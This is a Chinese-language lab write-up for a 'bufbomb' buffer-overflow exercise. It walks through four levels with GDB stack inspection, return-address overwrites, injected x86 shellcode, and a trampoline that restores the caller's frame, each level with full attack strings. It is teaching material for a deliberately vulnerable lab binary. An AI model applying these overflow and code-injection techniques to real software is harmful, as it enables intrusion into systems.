# 实验3：超级缓冲区炸弹

## 零、前置知识

### 0.1 什么是栈

程序运行时，每次调用函数，CPU 会在内存的**栈区**里划出一块空间叫**栈帧**，用来存局部变量、函数参数、返回地址等。栈从高地址向低地址增长。

一个典型的栈帧长这样（从低地址到高地址）：

```
┌──────────────────┐
│  局部变量          │  ← ESP 指向这里（栈顶，低地址）
├──────────────────┤
│  保存的 EBP       │  ← 上一个函数的栈底指针
├──────────────────┤
│  返回地址          │  ← 函数结束时 ret 跳转到这里
├──────────────────┤
│  参数（如果有）     │  ← 调用者放在栈上的参数
└──────────────────┘
```

关键指令：
- `push X`：把 X 压入栈，ESP 减 4
- `pop X`：从栈顶弹出给 X，ESP 加 4
- `call func`：把下一条指令的地址压栈（返回地址），然后跳转到 func
- `ret`：从栈顶弹出一个地址，跳转过去（return）

### 0.2 什么是缓冲区溢出

`getbuf()` 函数在栈上分配了 **12 字节**的缓冲区 `buf[12]`，然后调用 `getxs(buf)` 读取用户输入。`getxs()` **不检查输入长度**。

如果你输入超过 12 字节，多出的数据就会**向上溢出**，覆盖：
1. `buf` 后面的**保存的 EBP**（4 字节）
2. 再后面的**返回地址**（4 字节）

覆盖返回地址 = 劫持程序控制流。这就是缓冲区溢出攻击。

### 0.3 小端序

x86 CPU 用**小端序**存储数据：最低字节存在最低地址。

例如地址 `0x004011F0`，在内存中存为 `F0 11 40 00`（字节顺序反转）。

所有攻击字符串中的地址都必须写成小端序。

### 0.4 本次实验的四个关卡

| 关卡 | 目标 | 核心技术 |
|------|------|---------|
| 第1关 | 跳到 `Trojan1()` | 覆盖返回地址 |
| 第2关 | 跳到 `Trojan2(cookie)` | 覆盖返回地址 + 构造栈参数 |
| 第3关 | 跳到 `Trojan3()`，但先执行注入的代码 | 注入 shellcode |
| 第4关 | 同第3关，但函数返回后程序不能崩溃 | shellcode + 恢复栈帧 |

---

## 一、准备工作

### 1.1 运行程序获取 cookie

程序用你的学号初始化一个伪随机数生成器，算出 `cookie` 值。每个学号对应唯一的 cookie。

```bash
echo "" | ./bufbomb.exe 720028
```

输出中会看到：

```
你的通行密码是0X2F3426A6
```

**记住这个值**：`cookie = 0x2F3426A6`，小端序 = `A6 26 34 2F`。

### 1.2 getbuf 的栈帧布局（从 IDA / GDB 反汇编得到）

用 GDB 在 `getbuf` 内部设断点（地址 `0x00401136` 是 `lea eax, [ebp-0xc]`），可以看到：

```
低地址 (栈顶)
  ┌──────────────┐
  │  buf[0]      │  ← ebp-0x0C  (你输入的第1个字节写在这里)
  │  buf[1]      │
  │  ...         │
  │  buf[11]     │  ← ebp-0x01  (你输入的第12个字节)
  ├──────────────┤
  │  保存的 ebp   │  ← ebp+0x00  (4 字节，test 函数的 ebp)
  ├──────────────┤
  │  返回地址     │  ← ebp+0x04  (4 字节，正常应回到 test)
  ├──────────────┤
  │  ...         │  ← ebp+0x08 及以上属于 test 的栈帧
  └──────────────┘
高地址 (栈底)
```

**关键**：从 `buf[0]` 到返回地址的偏移 = 12（buf 本身）+ 4（保存的 ebp）= **16 字节**。

所以攻击字符串的**第 17~20 字节**（索引 16~19）会覆盖返回地址。

### 1.3 关键地址（IDA / objdump 反汇编 bufbomb.exe 所得）

| 项目 | 地址 |
|------|------|
| `getbuf` 函数 | `0x00401130` |
| `test` 函数（getbuf 的调用者） | `0x00401150` |
| `Trojan1` 函数 | `0x004011F0` |
| `Trojan2` 函数 | `0x00401210` |
| `Trojan3` 函数 | `0x00401260` |
| `Trojan4` 函数 | `0x004012B0` |
| `cookie` 全局变量 | `0x00409000` |
| `global_value` 全局变量 | `0x00409004` |
| `test` 中 `call getbuf` 的返回点 | `0x00401181` |

> **如何验证这些地址？** 用 objdump 反汇编：
> ```bash
> objdump -d -M intel --start-address=0x004011f0 --stop-address=0x00401210 bufbomb.exe
> ```
> 输出应该能看到 `push 0x40730b` 等字符串地址，对应 Trojan1 里的 printf 调用。

### 1.4 用 GDB 获取 buf 的栈地址（第3、4关需要）

第3、4关需要在栈上执行代码，所以必须知道 `buf` 的确切内存地址。

```bash
# 1. 创建 GDB 脚本
cat > gdb_cmds.txt << 'EOF'
set args 720028
break *0x00401136
run
info registers eax esp ebp
x/12xw $ebp
quit
EOF

# 2. 运行 GDB
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" | gdb -batch -nx -x gdb_cmds.txt bufbomb.exe
```

输出关键信息：

```
eax            0x1afe38
esp            0x1afe24
ebp            0x1afe30

0x1afe30:  0x001afe48  0x00401181  0x0000006c  0x00401177
0x1afe40:  0x00000002  0xdeadbeef  0x001aff3c  0x0040140d
```

解读：
- `ebp = 0x001AFE30`：getbuf 的栈帧基址
- `[ebp] = 0x001AFE48`：**test 的 EBP**（保存的 ebp）
- `[ebp+4] = 0x00401181`：当前返回地址（指向 test 中 `call getbuf` 的下一条指令）
- `buf 地址 = ebp - 0xC = 0x001AFE24`

从这个栈转储还能读出 test 栈帧的完整信息：

| 地址 | 值 | 含义 |
|------|------|------|
| `0x001AFE24` | — | buf 起始地址 |
| `0x001AFE30` | `0x001AFE48` | getbuf 保存的 ebp = **test 的 EBP** |
| `0x001AFE34` | `0x00401181` | getbuf 的返回地址 |
| `0x001AFE38` | `0x0000006C` | test 的 alloca 缓冲区（`'l'` = 0x6C） |
| `0x001AFE44` | `0xDEADBEEF` | test 的 **bird 变量** |
| `0x001AFE48` | `0x001AFF3C` | test 保存的 ebp = **main 的 EBP** |
| `0x001AFE4C` | `0x0040140D` | test 的返回地址（回到 main） |

---

## 二、第1关：Trojan1 — 修改返回地址

### 2.1 目标

让 `getbuf()` 返回时不回到 `test()`，而是跳到 `Trojan1()`。

### 2.2 思路

`getbuf` 执行 `ret` 时，CPU 从栈上弹出返回地址并跳转过去。如果我把栈上的返回地址改成 `Trojan1` 的地址，`ret` 就会直接跳到 `Trojan1`。

### 2.3 构造攻击字符串

```
字节 0~11:   随意填充 buf（12 字节，用 00）
字节 12~15:  覆盖保存的 ebp（4 字节，随意填 00，反正 Trojan1 会调用 exit(0)）
字节 16~19:  覆盖返回地址 = Trojan1 地址
```

Trojan1 地址 = `0x004011F0`，小端序 = `F0 11 40 00`。

### 2.4 攻击字符串

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00
```

共 **20 字节**。

### 2.5 测试

```bash
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00" | ./bufbomb.exe 720028
```

**预期输出**（出现即通过）：

```
恭喜你！你已经成功偷偷运行了第1只木马!
通过第1只木马测试
```

### 2.6 为什么能通过

`getbuf` 返回时：
1. `mov esp, ebp`：恢复 ESP
2. `pop ebp`：弹出保存的 ebp（被覆盖成 00 00 00 00，无所谓）
3. `ret`：从栈顶弹出 4 字节 `F0 11 40 00` = `0x004011F0`，跳转到 Trojan1

Trojan1 打印通关信息后调用 `exit(0)` 直接结束程序，不需要返回，所以 ebp 被破坏也无所谓。

---

## 三、第2关：Trojan2(cookie) — 覆盖返回地址 + 构造栈参数

### 3.1 目标

跳到 `Trojan2(val)`，并且让参数 `val` 等于 `cookie`。

### 3.2 思路

第1关只改了返回地址。第2关还需要在栈上**放好参数**。

先看 Trojan2 的反汇编：

```asm
push ebx                  ; 保存 ebx
mov  ebx, [esp+0x8]       ; 从栈上读取参数 val ← 关键！
cmp  ebx, ds:0x409000     ; 与 cookie 比较
```

Trojan2 从 `[esp+0x8]` 读参数。为什么是 `esp+0x8` 而不是 `esp+0x4`？

因为 `ret` 弹出返回地址后 ESP 已经上移了 4 字节，然后 `push ebx` 又下移了 4 字节。所以 `[esp+0x8]` 对应的位置是：

```
                          ESP → ┌──────────────┐
push ebx 保存的旧 ebx           │  旧 ebx       │  ← esp+0x0
                                 ├──────────────┤
ret 弹出的返回地址（跳到这）      │  返回地址      │  ← esp+0x4
                                 ├──────────────┤
                                 │  参数 val      │  ← esp+0x8  ← 我们要控制这个
                                 └──────────────┘
```

所以在攻击字符串中，**返回地址后面 4 字节放 Trojan2 的返回地址**（无所谓，它会 exit），**再后面 4 字节放 cookie**。

### 3.3 构造攻击字符串

```
字节 0~11:   填充 buf（12 字节）
字节 12~15:  覆盖保存的 ebp（4 字节，随意）
字节 16~19:  返回地址 = Trojan2 = 0x00401210 → 10 12 40 00
字节 20~23:  Trojan2 的返回地址（无所谓，Trojan2 会 exit(0)）→ 00 00 00 00
字节 24~27:  参数 val = cookie = 0x2F3426A6 → A6 26 34 2F
```

### 3.4 攻击字符串

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F
```

共 **28 字节**。

### 3.5 测试

```bash
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F" | ./bufbomb.exe 720028
```

**预期输出**：

```
不错哦！第2只木马运行了，而且通行密码是正确的！(0X2F3426A6)
通过第2只木马测试
```

### 3.6 如果你的学号不同

只有最后 4 字节（cookie 值）不同。先运行一次程序看你的 cookie，然后把 cookie 转成小端序替换。

例如你的 cookie 是 `0x12345678`，小端序 = `78 56 34 12`，攻击字符串末尾就是 `78 56 34 12`。

---

## 四、第3关：Trojan3 — 在栈上注入并执行代码

### 4.1 目标

在栈上注入一段机器码（shellcode），让它：
1. 把 `cookie` 的值加载到 EAX
2. 把 EAX 存入 `global_value`
3. 跳转到 `Trojan3`

然后覆盖返回地址，让 `ret` 跳到栈上的 shellcode。

### 4.2 思路

第1、2关只改了栈上的数据（地址、参数）。第3关更进一步：**把可执行的机器指令放在栈上，然后跳过去执行**。

这要求栈内存是**可执行**的（没有 DEP 保护）。本实验的 `bufbomb.exe` 没有开启 DEP，所以栈上的代码可以直接运行。

### 4.3 设计 Shellcode

需要的操作：

```asm
MOV EAX, [0x409000]       ; 把 cookie 加载到 EAX
MOV [0x409004], EAX       ; 把 EAX 存入 global_value
PUSH 0x00401260           ; 把 Trojan3 地址压栈
RET                       ; 弹出 Trojan3 地址并跳转
```

每条指令的机器码（用 x86 32位编码）：

| 指令 | 机器码 | 字节数 |
|------|--------|--------|
| `MOV EAX, [0x409000]` | `A1 00 90 40 00` | 5 |
| `MOV [0x409004], EAX` | `A3 04 90 40 00` | 5 |
| `PUSH 0x00401260` | `68 60 12 40 00` | 5 |
| `RET` | `C3` | 1 |

共 **16 字节**。

### 4.4 放置 Shellcode

buf 只有 12 字节，shellcode 有 16 字节。解决方法：**让 shellcode 覆盖 buf + saved_ebp**。

```
字节 0~11:   shellcode 前 12 字节（覆盖 buf）
字节 12~15:  shellcode 后 4 字节（覆盖保存的 ebp，无所谓，Trojan3 会 exit）
字节 16~19:  返回地址 = buf 的栈地址 = 0x001AFE24 → 24 FE 1A 00
```

`ret` 会跳到 `0x001AFE24`，也就是 buf 的开头，开始执行 shellcode。

### 4.5 攻击字符串

```
A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00
```

共 **20 字节**。分解：

```
A1 00 90 40 00     ← MOV EAX, [cookie]
A3 04 90 40 00     ← MOV [global_value], EAX
68 60 12 40 00     ← PUSH Trojan3
C3                 ← RET
24 FE 1A 00        ← 返回地址 = buf 栈地址（0x001AFE24 的小端序）
```

### 4.6 测试

```bash
echo "A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00" | ./bufbomb.exe 720028
```

**预期输出**：

```
厉害！第3只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6
通过第3只木马测试
```

### 4.7 如果你的学号不同

只有最后 4 字节（buf 栈地址）不同。用 [1.4 节](#14-用-gdb-获取-buf-的栈地址第34关需要) 的方法获取你自己的 buf 地址，转成小端序替换最后 4 字节。

---

## 五、第4关：Trojan4 — Shellcode + 恢复栈帧

### 5.1 目标

与第3关类似：注入 shellcode 设置 `global_value = cookie`，然后跳到 `Trojan4`。但 `Trojan4` 不调用 `exit(0)`，而是 **`return`** 返回。程序必须继续正常运行，最终输出"鸟还活着！"。

### 5.2 难在哪

第3关的 Trojan3 调用 `exit(0)` 直接终止程序，所以不用管栈帧被破坏的问题。

第4关的 Trojan4 执行 `pop ebx; ret` 返回后，控制流回到 `test()` 函数。`test()` 会：

```c
if (bird == 0xdeadbeef) {        // 检查 bird 是否被破坏
    printf("鸟还活着！\n");
}
// ... 然后正常返回 main
```

`bird` 在 `test()` 的栈帧上（地址 `ebp-4`）。如果我们的溢出破坏了 `test` 的 EBP 或 `bird`，程序就会崩溃。

### 5.3 第3关的方法为什么不行

第3关把 16 字节 shellcode 放在 `buf + saved_ebp` 区域。这会覆盖：
- `saved_ebp`（test 的 EBP）→ 被覆盖成 shellcode 的字节 `12 40 00 C3`

Trojan4 返回后，`test()` 的 EBP 指向垃圾地址，访问 `[ebp-4]`（bird）就会读写到错误的内存，导致崩溃。

### 5.4 解决方案：Trampoline（跳板）技术

**核心思想**：不在 buf 开头放 shellcode，而是放一条短跳转指令（JMP），跳到栈上更高地址处的 shellcode。中间留出空间来**保留 test 栈帧中的关键数据**。

完整的攻击字符串布局（70 字节）：

```
字节  0~4:    JMP +0x27（跳到字节 44 的 shellcode）
字节  5~11:   填充（凑够 buf 的 12 字节）
字节 12~15:   保存 test 的 EBP = 0x001AFE48 → 48 FE 1A 00
字节 16~19:   返回地址 = buf 栈地址 = 0x001AFE24 → 24 FE 1A 00
字节 20~23:   Trojan4 返回后跳到 fixup 代码 = 0x001AFE60 → 60 FE 1A 00
字节 24~31:   填充（覆盖 test 的 alloca 缓冲区）
字节 32~35:   恢复 bird = 0xDEADBEEF → EF BE AD DE
字节 36~39:   恢复 test 的 saved_ebp = main 的 EBP = 0x001AFF3C → 3C FF 1A 00
字节 40~43:   恢复 test 的返回地址 = 0x0040140D → 0D 14 40 00
字节 44~59:   Shellcode（16 字节）
字节 60~69:   Fixup 代码：设置 EAX = cookie 后跳回 test（10 字节）
```

### 5.5 对应到内存地址

攻击字符串从 `0x001AFE24`（buf 起始）开始写入：

```
地址        | 字节偏移 | 内容               | 对应栈结构
------------|----------|--------------------|--------------------
0x001AFE24  |  0~4     | JMP shellcode      | ← buf[0..4]
0x001AFE29  |  5~11    | 00 填充            | ← buf[5..11]
0x001AFE30  | 12~15    | 48 FE 1A 00        | ← saved_ebp（test 的 EBP）
0x001AFE34  | 16~19    | 24 FE 1A 00        | ← 返回地址
0x001AFE38  | 20~23    | 60 FE 1A 00        | ← Trojan4 返回后跳到 fixup
0x001AFE3C  | 24~27    | 00 00 00 00        | ← alloca 缓冲区
0x001AFE40  | 28~31    | 00 00 00 00        | ← alloca 缓冲区 / saved_esi
0x001AFE44  | 32~35    | EF BE AD DE        | ← bird（必须保持 DEADBEEF！）
0x001AFE48  | 36~39    | 3C FF 1A 00        | ← test 的 saved_ebp（main 的 EBP）
0x001AFE4C  | 40~43    | 0D 14 40 00        | ← test 的返回地址（回到 main）
0x001AFE50  | 44~59    | shellcode          | ← 注入的代码
0x001AFE60  | 60~69    | fixup              | ← EAX=cookie 后跳回 test
```

### 5.6 执行流程详解

**第一步：getbuf 返回，跳到 JMP**

```
getbuf 的 ret → 弹出返回地址 0x001AFE24 → 跳到 buf 开头
```

**第二步：JMP 跳过敏感区域，到达 shellcode**

```
JMP +0x27 → 跳到 0x001AFE50（shellcode 所在地）
跳过了中间的 saved_ebp、bird 等需要保护的区域
```

**第三步：shellcode 执行**

```
MOV EAX, [0x409000]       ; EAX = cookie
MOV [0x409004], EAX       ; global_value = cookie
PUSH 0x004012B0           ; 压入 Trojan4 地址
RET                       ; 跳转到 Trojan4
```

**第四步：Trojan4 执行并返回到 fixup**

```
Trojan4 打印通关信息
Trojan4 执行 pop ebx; ret → 回到 fixup 代码（0x001AFE60）
```

**第五步：fixup 代码修复 EAX**

Trojan4 内部的 printf 会把 EAX 改成 printf 的返回值。我们需要 EAX = cookie，这样 test 才会输出"不错哦"。

```asm
MOV EAX, 0x2F3426A6      ; B8 A6 26 34 2F  → 手动把 cookie 写入 EAX
JMP 0x00401181            ; E9 17 13 25 00  → 跳回 test 中 call getbuf 之后
```

**第六步：test 继续，检查 bird 和返回值**

```
test 检查 [ebp-4] == 0xdeadbeef
  → ebp = 0x001AFE48（正确恢复！）
  → [ebp-4] = [0x001AFE44] = 0xDEADBEEF（正确恢复！）
  → 输出 "鸟还活着！"
```

**第七步：test 正常返回 main**

```
test 的 pop ebp → ebp = [0x001AFE48] = 0x001AFF3C（main 的 EBP，正确恢复！）
test 的 ret → 跳到 [0x001AFE4C] = 0x0040140D（main 中的返回点，正确恢复！）
程序正常结束
```

### 5.7 JMP 偏移量是怎么算的

JMP rel32 指令编码：`E9` + 4 字节有符号偏移。

偏移 = 目标地址 - (JMP 指令地址 + 5)

```
目标地址（shellcode）= 0x001AFE50
JMP 指令地址        = 0x001AFE24
偏移 = 0x001AFE50 - (0x001AFE24 + 5) = 0x001AFE50 - 0x001AFE29 = 0x27
```

所以 JMP 指令 = `E9 27 00 00 00`。

### 5.8 攻击字符串

```
E9 27 00 00 00 00 00 00 00 00 00 00 48 FE 1A 00 24 FE 1A 00 60 FE 1A 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 0D 14 40 00 A1 00 90 40 00 A3 04 90 40 00 68 B0 12 40 00 C3 B8 A6 26 34 2F E9 17 13 25 00
```

共 **70 字节**。分解：

```
E9 27 00 00 00     ← JMP 跳到 shellcode
00 00 00 00 00 00 00
48 FE 1A 00        ← saved_ebp = test 的 EBP
24 FE 1A 00        ← 返回地址 = buf 栈地址
60 FE 1A 00        ← Trojan4 返回后跳到 fixup
00 00 00 00 00 00 00 00
EF BE AD DE        ← bird = 0xDEADBEEF
3C FF 1A 00        ← test 的 saved_ebp = main 的 EBP
0D 14 40 00        ← test 的返回地址
A1 00 90 40 00     ← MOV EAX, [cookie]
A3 04 90 40 00     ← MOV [global_value], EAX
68 B0 12 40 00     ← PUSH Trojan4
C3                 ← RET
B8 A6 26 34 2F     ← MOV EAX, cookie（fixup：修复返回值）
E9 17 13 25 00     ← JMP test（fixup：跳回 0x00401181）
```

### 5.9 测试

```bash
echo "E9 27 00 00 00 00 00 00 00 00 00 00 48 FE 1A 00 24 FE 1A 00 60 FE 1A 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 0D 14 40 00 A1 00 90 40 00 A3 04 90 40 00 68 B0 12 40 00 C3 B8 A6 26 34 2F E9 17 13 25 00" | ./bufbomb.exe 720028
```

**预期输出**：

```
厉害！第4只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6
通过第4只木马测试
鸟还活着！
不错哦！缓冲区溢出成功，而且getbuf返回 0X2F3426A6
```

### 5.10 如果你的学号不同

需要替换以下值（全部用 [1.4 节](#14-用-gdb-获取-buf-的栈地址第34关需要) 的方法获取）：

| 需要替换的值 | 在字符串中的位置 | 如何获取 |
|-------------|----------------|---------|
| buf 栈地址 | 字节 16~19（`24 FE 1A 00`）和 JMP 偏移（字节 1~4） | GDB 读 EAX 或 `ebp-0xC` |
| test 的 EBP | 字节 12~15（`48 FE 1A 00`） | GDB 读 `[getbuf的ebp]` |
| main 的 EBP | 字节 36~39（`3C FF 1A 00`） | GDB 读 `[test的ebp]` |
| test 返回地址 | 字节 40~43（`0D 14 40 00`） | GDB 读 `[test的ebp+4]` |
| cookie | 第2关字节 24~27 | 运行程序看输出 |

---

## 六、完整复现步骤（从零开始）

### 步骤 1：确认学号和 cookie

```bash
echo "" | ./bufbomb.exe 你的学号
```

记下 cookie 值。

### 步骤 2：反汇编确认地址

```bash
objdump -d -M intel --start-address=0x00401130 --stop-address=0x004012C0 bufbomb.exe
```

对照源码确认各函数入口地址。

### 步骤 3：GDB 获取栈地址

```bash
cat > gdb_cmds.txt << 'EOF'
set args 你的学号
break *0x00401136
run
info registers eax esp ebp
x/12xw $ebp
quit
EOF

echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" | gdb -batch -nx -x gdb_cmds.txt bufbomb.exe
```

记录：
- buf 地址 = `ebp - 0xC`
- test 的 EBP = `[ebp]`
- main 的 EBP = `[test的ebp]`
- test 返回地址 = `[test的ebp + 4]`

### 步骤 4：逐关测试

```bash
# 第1关
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00" | ./bufbomb.exe 你的学号

# 第2关（替换 cookie 的小端序）
echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 XX XX XX XX" | ./bufbomb.exe 你的学号

# 第3关（替换 buf 地址的小端序）
echo "A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 XX XX XX XX" | ./bufbomb.exe 你的学号

# 第4关（替换所有栈相关值）
echo "E9 XX 00 00 00 00 00 00 00 00 00 00 XX XX XX XX XX XX XX XX XX XX XX XX 00 00 00 00 00 00 00 00 EF BE AD DE XX XX XX XX XX XX XX XX A1 00 90 40 00 A3 04 90 40 00 68 B0 12 40 00 C3 B8 XX XX XX XX E9 XX XX XX XX" | ./bufbomb.exe 你的学号
```

### 步骤 5：清理临时文件

```bash
rm gdb_cmds.txt
```

---

## 七、常见问题

### Q: 提示"鸟死了！堆栈已经被破坏了"？

A: 说明溢出覆盖了 `test()` 中的 `bird` 变量。检查：
- 第4关是否正确设置了字节 32~35 为 `EF BE AD DE`
- 是否正确恢复了 test 的 saved_ebp（字节 12~15 和字节 36~39）

### Q: 程序崩溃（无输出就挂了）？

A: 可能是返回地址写错了。检查：
- 地址是否用了**小端序**
- 地址是否拼写正确
- 第3/4关的栈地址是否是你 GDB 调试得到的（不同学号地址不同）

### Q: 第3/4关段错误？

A: buf 的栈地址每次运行可能不同（但同一学号在同一系统上通常是稳定的）。用 GDB 重新获取地址后立刻测试。

### Q: 如何把地址/cookie 转成小端序？

A: 按字节拆开，反转顺序。例如 `0x004011F0`：
```
原始：00 40 11 F0
小端序：F0 11 40 00
```

### Q: 为什么第4关要用 JMP 而不是直接放 shellcode？

A: 直接放 shellcode（16 字节）会覆盖 saved_ebp，导致 Trojan4 返回后 test 的 EBP 错误。JMP 把 shellcode 跳到更高地址，中间留出空间恢复 bird 和 saved_ebp。

另外 Trojan4 内部的 printf 会把 EAX 改成 printf 返回值，导致 test 输出"不对哦"。所以在 shellcode 后面加了一段 fixup 代码，在 Trojan4 返回后把 EAX 修正为 cookie，再跳回 test。
